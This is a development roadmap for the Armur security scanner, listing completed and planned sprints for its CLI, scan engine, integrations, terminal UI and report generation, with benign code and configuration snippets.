# Armur Security Agent — Improvement Roadmap

Your personal security agent. SAST + DAST + exploit simulation + attack path analysis — all automated.
Built for the era of AI-generated code where automated security validation is essential.

## Release Plan

| Release | Phase | Sprints | What Ships |
|---------|-------|---------|------------|
| **v1.0** | Core Product | 5–14 | Polished CLI + TUI, typed Finding pipeline, zero-config UX, docs, SCA |
| **v2.0** | The Agent Edge | 15–21 | Rebrand, AI layer, sandboxed DAST, exploit sim, attack paths, PR agent, MCP |
| **v2.5** | Distribution | 22–27 | Homebrew/npm/pip, GitHub App, VS Code, CI/CD, onboarding, analytics |
| **v3.0** | Scanner Depth | 28–33 | Deep secrets, taint tracking, API security, compliance, SBOM, supply chain |
| **v4.0** | Enterprise | 34–39 | Teams/RBAC, scale, governance, threat intel, multi-tenant, LLM security |

---

## Phase 1: Foundation (DONE) — Sprints 1–4

These sprints established the core infrastructure: tests, error handling, auth, logging,
performance, integrations, and language expansion. All marked complete.

---

### Sprint 1 — Foundation (Make it Trustworthy) [DONE]

#### 1.1 Test Suite
- [x] Create `testdata/` directory with vulnerable code fixtures for each supported language
  - [x] `testdata/go/` — Go files with known vulnerabilities (SQL injection, hardcoded secrets, etc.)
  - [x] `testdata/python/` — Python files with known vulnerabilities
  - [x] `testdata/js/` — JavaScript/TypeScript files with known vulnerabilities
- [x] Write unit tests for every tool wrapper in `internal/tools/`
  - [x] Mock `exec.Command` to avoid requiring tools installed in CI
  - [x] Test happy path (tool runs, results parsed correctly)
  - [x] Test failure path (tool not found, tool exits non-zero, malformed output)
- [x] Write unit tests for result merging/aggregation (`internal/tasks/tasks.go`)
- [x] Write unit tests for CWE mapping logic
- [x] Write unit tests for language detection logic
- [x] Write integration tests for the full scan pipeline using `testdata/` fixtures
- [x] Write API handler tests (`internal/api/handlers.go`)
- [x] Add test coverage reporting (`go test -cover ./...`)
- [x] Enforce minimum 70% test coverage in CI
- [x] Add `go test ./...` to `Makefile`

#### 1.2 Error Propagation
- [x] Audit all occurrences of `results, _ := RunTool()` and replace with proper error handling
- [x] Add `Errors []ScanError` field to the scan result response payload
  - [x] Each `ScanError` should include: tool name, error message, exit code
- [x] Surface tool-not-found errors to the user (e.g., "gosec not found in PATH")
- [x] Ensure a single tool failure never silently nulls out its section of results
- [x] Add error context to all `log.Printf` / `log.Println` calls (include repo URL, tool name, task ID)
- [x] Remove all bare `panic()` calls; replace with graceful error returns

#### 1.3 Input Validation & Security Hardening
- [x] Validate Git URLs before cloning
  - [x] Allowlist `https://` scheme only (block `file://`, `ssh://`, `git://`)
  - [x] Block private/internal IP ranges in resolved hostnames
- [x] Add file size limit for `/api/v1/scan/file` uploads (e.g., 50MB max)
- [x] Sanitize all directory path inputs to prevent path traversal attacks
- [x] Add rate limiting middleware to all API endpoints (e.g., 10 scans/min per IP)
- [x] Validate `task_id` format before Redis lookups (UUID format check)
- [x] Add request body size limit to the Gin server

#### 1.4 Structured Logging
- [x] Replace all `fmt.Println` / `log.Println` with a structured logger (`zerolog` or `zap`)
- [x] Remove all debug `fmt.Println` statements from production code paths
- [x] Add log levels: DEBUG, INFO, WARN, ERROR
- [x] Add `--verbose` / `-v` flag to CLI for debug output
- [x] Include contextual fields in all log entries: `task_id`, `tool`, `repo_url`, `duration_ms`
- [x] Add request/response logging middleware to the API server

#### 1.5 API Authentication
- [x] Implement API key authentication middleware
  - [x] Generate API key on server start (or via config)
  - [x] Require `Authorization: Bearer <key>` header on all endpoints
  - [x] Return `401 Unauthorized` for missing/invalid keys
- [x] Add API key to CLI config (`armur config set api-key <key>`)
- [ ] Document authentication in README and Swagger spec

---

### Sprint 2 — Performance & Architecture [DONE]

#### 2.1 Parallel Tool Execution
- [x] Refactor `RunSimpleScan()` to execute tools concurrently using goroutines + `sync.WaitGroup`
- [x] Refactor `RunAdvancedScans()` similarly
- [x] Use a result channel to collect tool outputs safely
- [x] Add a configurable concurrency limit (env var: `MAX_TOOL_CONCURRENCY`, default: 5)
- [x] Add per-tool timeout (env var: `TOOL_TIMEOUT_SECONDS`, default: 300)
- [ ] Benchmark before/after to document speedup

#### 2.2 Diff / Incremental Scanning
- [x] Add `--diff <base-ref>` flag to `armur scan` (e.g., `--diff HEAD~1`, `--diff main`)
- [x] Implement git diff logic to extract list of changed files
- [x] Pass changed-files list to tool wrappers; skip unchanged files
- [x] Add `changed_files_only` field to the scan API request body
- [ ] Document diff scanning in README

#### 2.3 Plugin System for Custom Tools
- [x] Define plugin interface spec in `.armur.yml`:
  ```yaml
  plugins:
    - name: my-tool
      command: my-tool --json {target}
      output-format: json
      language: go
  ```
- [x] Implement plugin loader that reads `.armur.yml` from the scanned repo root
- [x] Implement generic tool runner that executes plugin command and parses JSON output
- [x] Add plugin result category `custom_tool` in aggregated results
- [ ] Document plugin system with examples in docs

#### 2.4 Project-Level Configuration File
- [x] Support `.armur.yml` in the scanned repository root
- [x] Config options to support:
  - [x] `exclude` — glob patterns for files/dirs to skip
  - [x] `tools.enabled` — explicit tool allowlist
  - [x] `tools.disabled` — explicit tool blocklist
  - [x] `severity-threshold` — minimum severity to report (info/low/medium/high/critical)
  - [x] `fail-on-findings` — exit code 1 if findings exceed threshold (for CI use)
- [ ] Document all config options in README and docs

#### 2.5 Smaller Docker Image
- [x] Refactor `Dockerfile` to use multi-stage builds
- [x] Create language-specific image variants:
  - [x] `armur:go` — Go tools only
  - [x] `armur:python` — Python tools only
  - [x] `armur:js` — JavaScript/TypeScript tools only
  - [x] `armur:full` — all tools (current behavior)
- [ ] Publish image variants to Docker Hub with size documentation
- [x] Use `alpine` base where possible to reduce layer sizes
- [ ] Document image variant selection in README

#### 2.6 Code Quality Cleanup
- [x] Split `utils.go` (758 lines) into focused modules:
  - [x] `format.go` — result formatting and table rendering
  - [x] `report.go` — OWASP/SANS report generation
- [ ] Standardize tool wrapper function signatures across all 18 tool files
- [x] Remove hardcoded paths (e.g., `/armur/repos`); move to config/env vars
- [ ] Fix all `golangci-lint` warnings on the codebase itself

---

### Sprint 3 — Integrations & Adoption [DONE]

#### 3.1 SARIF Output Format
- [x] Implement SARIF 2.1.0 output format for scan results
- [x] Add `--format sarif` flag to `armur scan` CLI command
- [x] Add `format=sarif` query param to API status endpoint
- [x] Map all existing CWE/finding data to SARIF `result`, `rule`, `location` objects
- [ ] Validate output against SARIF schema
- [ ] Add SARIF output example to README
- [ ] Document GitHub Code Scanning upload workflow

#### 3.2 GitHub Actions Integration
- [x] Create `armur-ai/armur-scan-action` GitHub Action repository
- [x] Implement action with inputs:
  - [x] `target` — path to scan (default: `.`)
  - [x] `fail-on-severity` — minimum severity to fail the workflow
  - [x] `output-format` — `sarif`, `json`, or `table`
  - [x] `languages` — comma-separated language filter
- [x] Upload SARIF to GitHub Code Scanning via `github/codeql-action/upload-sarif`
- [ ] Add PR comment with finding summary using GitHub API
- [ ] Publish to GitHub Actions Marketplace
- [ ] Add usage example to main README

#### 3.3 Pre-commit Hook Support
- [x] Create `.pre-commit-hooks.yaml` in repo root
- [x] Implement fast pre-commit scan (staged files only, skip slow tools)
- [ ] Document setup in README:
  ```yaml
  repos:
    - repo: https://github.com/armur-ai/armur-scanner
      hooks:
        - id: armur-scan
  ```
- [x] Add `--staged-only` flag to CLI for pre-commit use case

#### 3.4 Webhook Notifications
- [x] Add `webhook_url` field to scan request payload
- [x] POST scan results to webhook URL on task completion
- [x] Include HMAC signature header for webhook verification
- [x] Add retry logic for failed webhook deliveries (3 retries, exponential backoff)
- [ ] Document webhook payload schema

#### 3.5 GitLab CI Integration
- [x] Create GitLab CI template (`.gitlab-ci.yml` snippet)
- [x] Map SARIF output to GitLab SAST report format
- [x] Document GitLab Security Dashboard integration
- [x] Add GitLab template to docs

---

### Sprint 4 — Language Expansion [DONE]

#### 4.1 Rust Support
- [x] Add `cargo-audit` integration (dependency vulnerability scanning)
- [x] Add `cargo-geiger` integration (unsafe code detection)
- [x] Add `clippy` integration (linting and common mistakes)
- [x] Add Rust file extension detection (`*.rs`, `Cargo.toml`)
- [x] Add Rust to language detection logic
- [x] Add Rust fixtures to `testdata/`
- [ ] Document Rust support in README

#### 4.2 Java / Kotlin Support
- [x] Add `SpotBugs` integration (bug pattern detection)
- [x] Add `PMD` integration (code quality)
- [x] Add `OWASP Dependency-Check` integration (SCA for Java)
- [x] Add Java/Kotlin file extension detection
- [x] Add Java/Kotlin to language detection logic
- [x] Add Java/Kotlin fixtures to `testdata/`
- [ ] Document Java/Kotlin support in README

#### 4.3 Ruby Support
- [x] Add `Brakeman` integration (Rails security scanner)
- [x] Add `bundler-audit` integration (gem vulnerability scanning)
- [x] Add Ruby file extension detection (`*.rb`, `Gemfile`)
- [x] Add Ruby fixtures to `testdata/`

#### 4.4 PHP Support
- [x] Add `PHPCS` with security sniffs integration
- [x] Add `Psalm` integration (static analysis)
- [x] Add PHP file extension detection (`*.php`)
- [x] Add PHP fixtures to `testdata/`

#### 4.5 C / C++ Support
- [x] Add `cppcheck` integration
- [x] Add `Flawfinder` integration (security-focused C/C++ scanner)
- [x] Add C/C++ file extension detection
- [x] Add C/C++ fixtures to `testdata/`

#### 4.6 Infrastructure / IaC Expansion
- [x] Add `hadolint` integration (Dockerfile linting)
- [x] Add `tfsec` integration (Terraform security)
- [x] Add `kics` integration (multi-IaC platform)
- [x] Add `kube-linter` integration (Kubernetes manifest validation)
- [x] Add `kube-score` integration (Kubernetes best practices)
- [x] Detect IaC file types automatically (`*.tf`, `Dockerfile`, `*.yaml` with k8s markers)

#### 4.7 Solidity / Web3 Support
- [x] Add `Slither` integration (Solidity static analyzer)
- [x] Add `Mythril` integration (symbolic execution for smart contracts)
- [x] Add Solidity file extension detection (`*.sol`)
- [x] Add Solidity fixtures to `testdata/`

---

## Phase 2: Core Product (v1.0) — Sprints 5–14

The polished developer experience. After this phase, `armur run` in any project directory
just works — beautiful TUI, typed results, zero-config UX, comprehensive docs, and full SCA.

---

### Sprint 5 — CLI Polish & UX

#### 5.1 Embedded Server Mode
- [ ] Add `armur serve` command that starts the API server locally
- [ ] Auto-detect if a server is already running before starting a new one
- [ ] Support `armur scan .` without any prior setup (auto-start server if needed)
- [ ] Add `--no-server` flag for users managing the server themselves

#### 5.2 Real-Time Streaming Output
- [ ] Stream tool progress to CLI as scan runs (server-sent events or polling)
- [ ] Show which tools are currently running with a live spinner per tool
- [ ] Show elapsed time per tool
- [ ] Display a live finding counter that updates as results come in

#### 5.3 Improved Scan Summary
- [ ] Display a summary card at end of scan:
  ```
  ┌─────────────────────────────────────┐
  │           Scan Complete             │
  ├──────────┬──────────┬──────────┬────┤
  │ Critical │   High   │  Medium  │ Low│
  │    3     │    12    │    27    │ 41 │
  └──────────┴──────────┴──────────┴────┘
  ```
- [ ] Add `--fail-on-severity <level>` flag (non-zero exit code if findings found)
- [ ] Add severity filter flag `--min-severity <level>` to suppress noise

#### 5.4 Scan History Improvements
- [ ] Replace JSON file history with SQLite (`~/.armur/history.db`)
- [ ] `armur history` — list past scans with timestamps, targets, finding counts
- [ ] `armur history show <id>` — show full results of a past scan
- [ ] `armur compare <scan-id-1> <scan-id-2>` — diff two scan results (new/fixed findings)
- [ ] `armur history clear` — wipe local history

#### 5.5 Command Naming & UX Fixes
- [ ] Rename `scan-i` to `scan --interactive` (or make interactive the default with no args)
- [ ] Add `armur init` command to create `.armur.yml` in current directory with sane defaults
- [ ] Add `armur doctor` command to check which tools are installed and working
- [ ] Add shell completion support (`armur completion bash/zsh/fish/powershell`)
- [ ] Add `--watch` mode to re-scan on file changes (development workflow)

#### 5.6 Report Generation
- [ ] Add `armur report --format html --task <id>` — generate standalone HTML report
  - [ ] Include severity distribution chart
  - [ ] Include CWE category breakdown
  - [ ] Include file-by-file findings
  - [ ] Make it self-contained (no external dependencies)
- [ ] Add `armur report --format pdf` — PDF version of the HTML report
- [ ] Add `armur report --format csv` — spreadsheet-friendly export

---

### Sprint 6 — Core Engine Overhaul

All language-specific tools read the same directory independently; there is no reason to run them
sequentially. Parallelizing cuts scan time by 3–5x for a typical Go project.

#### 6.1 Parallel Tool Execution

- [ ] Refactor `RunSimpleScan` and `RunAdvancedScans` to a concurrent pattern:
  ```go
  type toolResult struct {
      tool    string
      results map[string]interface{}
      err     error
  }
  results := make(chan toolResult, len(tools))
  var wg sync.WaitGroup
  for _, t := range activeTools {
      wg.Add(1)
      go func(t toolRunner) {
          defer wg.Done()
          r, err := t.Run(ctx, dirPath)
          results <- toolResult{t.Name(), r, err}
      }(t)
  }
  wg.Wait()
  close(results)
  ```
- [ ] Use a semaphore (`chan struct{}`) to cap concurrent tool goroutines to `MAX_TOOL_CONCURRENCY`
- [ ] Wrap each tool `exec.Command` in a `context.WithTimeout(ctx, TOOL_TIMEOUT)` so hung tools are killed
- [ ] Merge results from the channel after all goroutines finish (order-independent)
- [ ] Benchmark scan time before and after for a medium Go repo; document in `docs/benchmarks.md`

#### 6.2 Unified `Finding` Type

Replace all `map[string]interface{}` result flowing through the pipeline with a concrete typed struct.
This eliminates hundreds of fragile type assertions scattered across `tasks.go`, `scan.go`, and `utils.go`.

- [ ] Define `internal/models/finding.go`:
  ```go
  type Severity string
  const (
      SeverityCritical Severity = "CRITICAL"
      SeverityHigh     Severity = "HIGH"
      SeverityMedium   Severity = "MEDIUM"
      SeverityLow      Severity = "LOW"
      SeverityInfo     Severity = "INFO"
  )

  type Finding struct {
      ID          string   `json:"id"`              // SHA256 fingerprint (computed)
      Tool        string   `json:"tool"`
      Category    string   `json:"category"`        // security_issues | antipatterns_bugs | etc.
      File        string   `json:"file"`
      Line        int      `json:"line"`
      EndLine     int      `json:"end_line,omitempty"`
      Column      int      `json:"column,omitempty"`
      RuleID      string   `json:"rule_id,omitempty"`
      CWE         string   `json:"cwe,omitempty"`
      OWASP       string   `json:"owasp,omitempty"`
      Severity    Severity `json:"severity"`
      Message     string   `json:"message"`
      Snippet     string   `json:"snippet,omitempty"`      // 3-5 lines of code context
      Remediation string   `json:"remediation,omitempty"` // fix suggestion if tool provides one
  }
  ```
- [ ] Update every tool wrapper in `internal/tools/` to return `([]Finding, error)` instead of `(map[string]interface{}, error)`
- [ ] Update `RunSimpleScan` / `RunAdvancedScans` to aggregate `[]Finding`
- [ ] Update API response serialization to use `[]Finding`
- [ ] Update all CLI display functions (`utils.go`, `scan.go`) to use `Finding` fields directly
- [ ] Write unit tests asserting each tool wrapper's output shape

#### 6.3 Finding Fingerprinting & Deduplication

Multiple tools often report the same issue (e.g. gosec and semgrep both flag the same SQL injection).
Deduplicate before surfacing results to avoid noise.

- [ ] Compute `Finding.ID` as `hex(SHA256(tool + "|" + file + "|" + strconv.Itoa(line) + "|" + ruleID + "|" + message[:64]))`
- [ ] After merging all tool results, group by `(file, line, cwe)`:
  - If two findings share the same `file + line + CWE`, keep the one with more fields populated (prefer remediation hints)
  - Record the de-duplicated finding's ID in the surviving finding's `DuplicateOf []string` field
- [ ] Add deduplication metadata to scan result: `"meta": { "raw_count": 34, "after_dedup": 17, "dupes_removed": 17 }`
- [ ] Write unit tests for deduplication with synthetic overlapping inputs

#### 6.4 Severity Normalization

Each tool uses different severity representations. Normalize all of them to the canonical `Severity` enum at parse time inside each tool wrapper so the rest of the pipeline never needs to handle raw severity strings.

- [ ] Create `internal/tools/severity.go` with `Normalize(raw string) Severity`
- [ ] Add tool-specific normalization rules:
  - `gosec`: `"HIGH"/"MEDIUM"/"LOW"` → direct mapping
  - `bandit`: `"HIGH"/"MEDIUM"/"LOW"` → direct mapping
  - `semgrep`: `"ERROR"` → High, `"WARNING"` → Medium, `"INFO"` → Info
  - `eslint`: numeric `2` → High, `1` → Medium, `0` → Info
  - `trufflehog`: all findings → Critical (credentials are always critical)
  - `gocyclo`: complexity > 20 → High, > 10 → Medium, else Low
  - `checkov`: `"FAILED"` → Medium by default; specific check IDs mapped to higher severity
  - `trivy`: `"CRITICAL"/"HIGH"/"MEDIUM"/"LOW"/"UNKNOWN"` → direct mapping
  - `osv-scanner`: use ecosystem CVSS score bands: ≥9.0 → Critical, ≥7.0 → High, ≥4.0 → Medium, else Low
- [ ] Write unit tests for every normalization branch

#### 6.5 Scan Cancellation

- [ ] Add `DELETE /api/v1/scan/:task_id` endpoint to cancel an in-progress scan
- [ ] Store a `context.CancelFunc` per task in a registry (`sync.Map`) keyed by task ID
- [ ] Cancel endpoint calls the stored `CancelFunc`, which propagates through all tool goroutines via `context.WithCancel`
- [ ] On cancellation: kill running subprocess (if any), clean up temp directories, store `"status": "cancelled"` in Redis
- [ ] CLI: pressing `q` in the scan dashboard calls the cancel endpoint before exiting

---

### Sprint 7 — `armur run`: Flagship TUI Command

The primary user-facing goal: a single entry point that replaces `scan`, `scan-i`, and all manual flags.
Running `armur run` with no arguments opens a beautiful full-screen TUI that walks the user through
everything and shows live progress as the scan executes.

#### 7.1 `armur run` Wizard (Multi-Step Setup Form)

The first thing the user sees — a guided setup before the scan begins.

- [ ] Add `armur run` as a new top-level Cobra command (additive; does not replace `scan`)
- [ ] Implement a multi-step `charmbracelet/huh` form wizard:
  - [ ] **Step 1 — Target**: auto-fill current directory if it is a git repo; three options:
    - Current directory (pre-selected when inside a git repo, shown as `./`)
    - Enter a local path (file or directory picker)
    - Enter a remote git repository URL
  - [ ] **Step 2 — Scan depth**: "Quick" (simple tool suite, ~30s) vs "Deep" (full advanced suite, ~2–3m)
  - [ ] **Step 3 — Language** (skip if auto-detected with >80% confidence): dropdown with Go, Python, JavaScript/TypeScript, Auto-detect
  - [ ] **Step 4 — Output**: Text (default), JSON, SARIF — plus toggle "Save report to file"
  - [ ] **Step 5 — Confirmation screen**: show summary of choices before scan begins; buttons: "Start Scan" / "Go Back" / "Cancel"
- [ ] Pressing Ctrl+C at any wizard step exits cleanly with "Scan cancelled."
- [ ] Persist last-used wizard choices to `~/.armur/last_run.json` and pre-fill them on the next `armur run`
- [ ] Read `.armur.yml` from current directory (if present) to further pre-fill defaults

#### 7.2 Live Scan Dashboard (Bubbletea Full-Screen TUI)

After the wizard, transition to a full-screen Bubbletea model that shows real-time scan progress.

- [ ] Create `cli/internal/tui/` package for all Bubbletea models and messages
- [ ] Implement `ScanDashboard` Bubbletea model with the following terminal layout:
  ```
  ╔══════════════════════════════════════════════════════╗
  ║  ARMUR  ·  Scanning: ./my-project  ·  Deep scan     ║
  ╠══════════════════════════════════════════════════════╣
  ║  Tool              Progress          Status  Found  ║
  ║  ──────────────────────────────────────────────────  ║
  ║  semgrep           [██████████] 100%  ✓ Done    14  ║
  ║  gosec             [████░░░░░░]  42%  ⟳ Running  3  ║
  ║  golint            [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  staticcheck       [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  gocyclo           [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  trufflehog        [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ╠══════════════════════════════════════════════════════╣
  ║  Critical: 0  High: 3  Medium: 8  Low: 6  Info: 0  ║
  ║  Elapsed: 0:23                           [q] Quit  ║
  ╚══════════════════════════════════════════════════════╝
  ```
- [ ] Use `github.com/charmbracelet/bubbles/progress` for per-tool progress bars
- [ ] Use `github.com/charmbracelet/bubbles/spinner` for the currently-running tool indicator
- [ ] Each tool row updates in real time: name, progress bar, status icon, finding count
  - Status icons: `○` queued · `⟳` running · `✓` done · `✗` failed · `⚠` skipped (tool not installed)
- [ ] Severity counter row in the footer updates as findings arrive
- [ ] Elapsed time counter ticks every second
- [ ] Press `q` or Ctrl+C to cancel the scan mid-run (sends cancel to server, cleans up, exits)
- [ ] Press `p` to pause live updates (freeze screen to read without stopping the scan)
- [ ] Degrade gracefully: if terminal is too narrow, collapse to a single-line spinner + counts

#### 7.3 Post-Scan Results Browser (Interactive Viewer)

After scan completion, transition directly to a two-pane interactive results browser without leaving the TUI.

- [ ] Implement `ResultsBrowser` Bubbletea model with:
  - **Left pane** — scrollable finding list, sorted by severity desc
  - **Right pane** — detail view of the currently selected finding
- [ ] Finding list row: `[SEV]  file/path.go:42  rule-id  Short message truncated...`
- [ ] Severity badges color-coded with lipgloss: `[CRIT]` · `[HIGH]` · `[MED]` · `[LOW]` · `[INFO]`
- [ ] Keyboard navigation:
  - `↑`/`↓` or `j`/`k` — move through the findings list
  - `Enter` — expand/collapse the right-pane detail view
  - `f` — toggle filter sidebar (multi-select: severity, category, file glob, tool)
  - `s` — cycle sort order: severity desc → file → tool → line number
  - `/` — inline search: filter by substring across file path and message
  - `e` — export current filtered view (JSON or text, prompts for filename)
  - `r` — open report submenu (generate HTML / CSV / Markdown)
  - `q` — quit to shell
- [ ] Right-pane detail view shows:
  - File path + line number (highlighted)
  - Rule ID and CWE (if available) as badges
  - Full finding message
  - 5-line code snippet with the offending line highlighted (read from local file if available)
  - Tool name that reported it
  - Remediation hint (if the tool provides one)
- [ ] Summary bar above the list: `17 findings · Critical 1  High 5  Medium 8  Low 3 · Showing: all`
- [ ] Filter sidebar: checkbox groups for each dimension; updates list in real time as filters change

#### 7.4 Post-Scan Summary Card (Static Output After TUI Exits)

When the user quits the TUI, print a compact lipgloss-styled summary card to stdout that remains visible in the terminal history.

- [ ] Print a bordered summary card using `charmbracelet/lipgloss`:
  ```
  ┌────────────────────────────────────────────────┐
  │  Scan Complete — ./my-project (Go, Deep)       │
  │  Duration: 1m 43s  ·  Tools: 5 ok, 0 failed   │
  ├──────────┬──────────┬──────────┬───────────────┤
  │ Critical │   High   │  Medium  │  Low / Info   │
  │    1     │    5     │    8     │     3 / 7     │
  └──────────┴──────────┴──────────┴───────────────┘
  Task ID:  abc-123-def
  Report:   ~/.armur/reports/abc-123-def.json
  Run 'armur history show abc-123-def' to view again.
  ```
- [ ] Severity counts colored (red / yellow / green) using lipgloss
- [ ] Print only if there were findings; if zero findings: print a green "✓ No issues found." card instead
- [ ] If `--fail-on-severity` was set and threshold exceeded: print exit code warning before exiting with code 1

---

### Sprint 8 — Smart Scanning & Zero-Config UX

The goal: `armur run` in any project directory just works with no flags or prior setup required.

#### 8.1 Auto-Detect Everything from Context

- [ ] On `armur run` with no args, walk up from `cwd` to find the nearest `.git` directory and use that as the scan root
- [ ] Auto-detect language from file extension frequency (`.go` files dominant → Go, etc.)
- [ ] If a single language is detected with high confidence, skip the language wizard step and show "Language: Go (auto-detected)" in the confirmation
- [ ] Handle multi-language repos: if two or more languages are detected, offer "Scan all" or let user pick one from a checkbox list
- [ ] Auto-detect `.armur.yml` in the repo root and pre-fill all wizard fields from it

#### 8.2 `.armur.yml` Project Config File

Full support for a repo-level config that controls scan behavior without any CLI flags.

- [ ] Define and document the `.armur.yml` schema:
  ```yaml
  scan:
    depth: quick              # quick | deep
    language: go              # override auto-detection; omit for auto
    severity-threshold: medium  # minimum severity to include in output
    fail-on-findings: true    # exit with code 1 if any findings at threshold or above

  exclude:
    - vendor/
    - "**/*_test.go"
    - testdata/
    - "*.pb.go"

  tools:
    disabled:
      - gocyclo               # skip this tool
    timeout: 120              # per-tool timeout in seconds (overrides env var)

  output:
    format: text              # text | json | sarif
    save-to: ./reports/       # directory to auto-save reports after each scan

  plugins:
    - name: my-custom-linter
      command: "my-linter --json {target}"
      output-format: json
      language: go
  ```
- [ ] Server reads `.armur.yml` from the cloned/local repo root when executing tasks
- [ ] CLI reads `.armur.yml` from cwd to pre-fill wizard defaults
- [ ] Config file values are overridden by explicit CLI flags (flag > config > default)

#### 8.3 `armur init` Command

- [ ] `armur init` runs a short guided huh form and writes `.armur.yml` to the current directory
- [ ] Wizard fields: preferred depth, language override (or auto), severity threshold, paths to exclude
- [ ] Output file includes inline YAML comments explaining every field
- [ ] If `.armur.yml` already exists: prompt "Overwrite existing config? (y/N)"

#### 8.4 Diff / Incremental Scanning

- [ ] Add `--diff <base-ref>` flag to both `armur run` and `armur scan`
- [ ] Wizard Step 2.5 (shown only in "Quick" mode): optional "Only scan files changed since [git ref]" input
- [ ] Server: after cloning, run `git diff --name-only <base-ref>` to get the changed file list
- [ ] Pass changed file list into each tool wrapper; wrappers that support file-level targeting use it
- [ ] Tools that cannot target individual files (trufflehog, checkov) scan the full repo regardless
- [ ] Add diff metadata to scan result: `"diff_mode": true, "base_ref": "HEAD~1", "files_scanned": 12`
- [ ] `--staged-only` flag: pass only git-staged files (for pre-commit use case)

---

### Sprint 9 — `armur doctor` & CLI Completeness

#### 9.1 `armur doctor` Command

A self-diagnosis command that checks all prerequisites and reports what is working and what is missing.

- [ ] Implement `armur doctor` command
- [ ] Checks performed:
  - [ ] API server reachable at configured URL (GET `/health`, show version)
  - [ ] Redis reachable (server reports Redis status in `/health` response)
  - [ ] Docker running (if Docker-based deployment is configured)
  - [ ] For each of the 18 bundled tools: binary exists in PATH + print installed version
  - [ ] API key configured and accepted (authenticated request to `/api/v1/status/ping`)
  - [ ] `.armur.yml` present in cwd (informational only)
- [ ] Output format (lipgloss-styled):
  ```
  armur doctor
  ──────────────────────────────────────────────
  ✓  API server    http://localhost:4500  (v1.2.0)
  ✓  Redis         redis://localhost:6379  (pong)
  ✓  API key       configured
  ──────────────────────────────────────────────
  ✓  semgrep       1.45.0
  ✓  gosec         2.18.2
  ✗  gocyclo       NOT FOUND
                   → go install github.com/fzipp/gocyclo/cmd/gocyclo@latest
  ✓  bandit        1.7.5
  ⚠  pylint        3.0.1  (latest: 3.1.0)
  ──────────────────────────────────────────────
  1 tool missing. Fix the issues above to enable full scanning.
  ```
- [ ] Color-code: green ✓ / red ✗ / yellow ⚠
- [ ] Exit code 0 if server is reachable and all tools found; exit code 1 if anything critical is missing

#### 9.2 SQLite-Backed Scan History

Replace the current JSON file history with a SQLite database for reliable querying and pagination.

- [ ] Add `modernc.org/sqlite` dependency (pure Go, no CGo required)
- [ ] Initialize `~/.armur/history.db` on first run with schema:
  ```sql
  CREATE TABLE IF NOT EXISTS scans (
      id           TEXT PRIMARY KEY,
      target       TEXT NOT NULL,
      language     TEXT,
      mode         TEXT,
      started_at   DATETIME,
      finished_at  DATETIME,
      status       TEXT,
      critical     INTEGER DEFAULT 0,
      high         INTEGER DEFAULT 0,
      medium       INTEGER DEFAULT 0,
      low          INTEGER DEFAULT 0,
      info         INTEGER DEFAULT 0,
      report_path  TEXT
  );
  ```
- [ ] `armur history` — list last 20 scans in a lipgloss-styled table (newest first)
- [ ] `armur history --all` — list all scans with pagination (`--page`, `--limit` flags)
- [ ] `armur history show <id>` — re-display full results from the saved JSON report file
- [ ] `armur history clear` — wipe all rows (ask "Clear all scan history? (y/N)" first)
- [ ] `armur compare <id1> <id2>` — diff two scans; show:
  - New findings (in id2 but not id1) highlighted in red
  - Fixed findings (in id1 but not id2) highlighted in green
  - Unchanged findings (in both) in grey
- [ ] Auto-save full scan results JSON to `~/.armur/reports/<task-id>.json` after every completed scan
- [ ] Insert a history row after every scan (success or failure)

#### 9.3 Shell Completions

- [ ] Add `armur completion bash` — print Bash completion script
- [ ] Add `armur completion zsh` — print Zsh completion script
- [ ] Add `armur completion fish` — print Fish completion script
- [ ] Add `armur completion powershell` — print PowerShell completion script
- [ ] `armur history show <TAB>` — complete from scan IDs stored in local history DB
- [ ] Document how to install completions for each shell in README

#### 9.4 `--watch` Mode

- [ ] Add `--watch` flag to `armur run` / `armur scan`
- [ ] On file change in the scanned directory (using `fsnotify`), re-run the last scan config automatically
- [ ] In watch mode: use compact output (single-line per re-scan, not full-screen TUI)
  - e.g. `[14:32:01] File changed: main.go — re-scanning...`
  - e.g. `[14:32:34] Done. 2 new findings, 0 fixed. (high: 1, medium: 1)`
- [ ] Debounce: ignore file changes within 3 seconds of a scan start to avoid re-scan storms
- [ ] Exit watch mode cleanly on Ctrl+C

#### 9.5 `armur version` Command

- [ ] Add `armur version` command
- [ ] Embed at build time via `ldflags`: version tag, git commit hash, build date
- [ ] Output:
  ```
  armur v1.2.0 (commit abc1234, built 2026-03-05)
  ```
- [ ] `armur version --check` — fetch latest release from GitHub Releases API and compare; print upgrade hint if behind

---

### Sprint 10 — Result Display & Report Generation

#### 10.1 Rich Terminal Output (Redesigned Display Layer)

The current display is scattered across `scan.go` and `utils.go` with fragile manual column widths.
Centralize and redesign.

- [ ] Create `cli/internal/display/` package with clean public API:
  - `RenderFindingsTable(findings []Finding, opts RenderOpts) string`
  - `RenderSummaryCard(meta ScanMeta) string`
  - `RenderToolErrors(errs []ScanError) string`
- [ ] `RenderFindingsTable`:
  - [ ] Auto-detect terminal width via `golang.org/x/term` and adjust column widths dynamically
  - [ ] Group findings by category; print a bold lipgloss-styled category header before each group
  - [ ] Severity column: render as a colored lipgloss badge `[HIGH]` not raw text
  - [ ] Truncate long file paths from the left (`...internal/pkg/utils/foo.go`) not from the right
  - [ ] Alternate row background shading for readability in long lists
  - [ ] Show finding count per category in the group header: `Security Issues (14)`
- [ ] `RenderSummaryCard`: lipgloss-bordered card with severity counts (from Sprint 7.4)
- [ ] `RenderToolErrors`: yellow warning block listing tool failures at the end of output

#### 10.2 HTML Report Generation

- [ ] `armur report html --task <id>` — generate a standalone, self-contained HTML file
- [ ] Report sections:
  - [ ] Header: scan target, date, duration, tool versions used
  - [ ] Executive summary: severity counts + inline SVG donut chart (no JS)
  - [ ] CWE category breakdown table with finding counts
  - [ ] Per-file findings: grouped by file, each finding as a `<details>` collapsible row
  - [ ] Tool errors section: list of skipped/failed tools
  - [ ] Methodology section: one-line description of each tool run
- [ ] All CSS inlined in `<style>` block; no external CDN references; no JavaScript required
- [ ] Write to `~/.armur/reports/<task-id>.html`; print path after generation

#### 10.3 CSV & Markdown Report Generation

- [ ] `armur report csv --task <id>` — CSV with columns: ID, Tool, File, Line, Severity, CWE, OWASP, Message
- [ ] `armur report markdown --task <id>` — GFM table of findings (ready to paste into a GitHub comment)
- [ ] Both accept `--output <path>` to override the default save location

